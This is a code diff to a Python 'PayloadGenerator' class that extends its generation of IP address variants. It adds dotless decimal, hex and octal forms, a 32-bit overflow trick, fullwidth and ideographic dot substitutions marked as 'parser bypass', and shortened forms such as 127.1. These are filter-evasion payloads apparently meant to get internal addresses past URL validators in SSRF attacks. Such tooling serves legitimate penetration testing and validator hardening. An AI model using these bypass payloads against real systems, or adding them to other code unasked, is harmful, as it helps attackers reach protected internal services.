@@ -49,14 +49,38 @@ class PayloadGenerator:
                         # Original format
                         variations.add(ip)
                         
-                        # Decimal format
+                        # Decimal format (dotless), e.g. 127.0.0.1 -> 2130706433
                         try:
                             ipint = int.from_bytes(socket.inet_aton(ip), 'big')
                             variations.add(str(ipint))
+                            # Dotless hex, e.g. 0x7f000001
+                            variations.add(f"0x{ipint:08x}")
+                            variations.add(hex(ipint))
+                            # Dotless octal, e.g. 017700000001
+                            variations.add(f"0{ipint:o}")
+                            # 32-bit overflow trick (ip + 2^32 still resolves)
+                            variations.add(str(ipint + 4294967296))
                         except:
                             pass
 
-                        # Hex format (per octet)
+                        # Fullwidth / ideographic dot forms (parser bypass)
+                        try:
+                            variations.add(ip.replace('.', '\u3002'))  # 。 IDEOGRAPHIC FULL STOP
+                            variations.add(ip.replace('.', '\uff0e'))  # ． FULLWIDTH FULL STOP
+                            variations.add(ip.replace('.', '\uff61'))  # ｡ HALFWIDTH IDEOGRAPHIC STOP
+                        except:
+                            pass
+
+                        # Shorthand / partial forms, e.g. 127.0.0.1 -> 127.1
+                        try:
+                            if parts[1] == '0' and parts[2] == '0':
+                                variations.add(f"{parts[0]}.{parts[3]}")
+                            if parts[2] == '0':
+                                variations.add(f"{parts[0]}.{parts[1]}.{parts[3]}")
+                        except:
+                            pass
+
+                        # Hex format (per octet), e.g. 0x7f.0x0.0x0.0x1
                         try:
                             hex_parts = [hex(int(part))[2:] for part in parts]
                             variations.add('.'.join(f"0x{part}" for part in hex_parts))
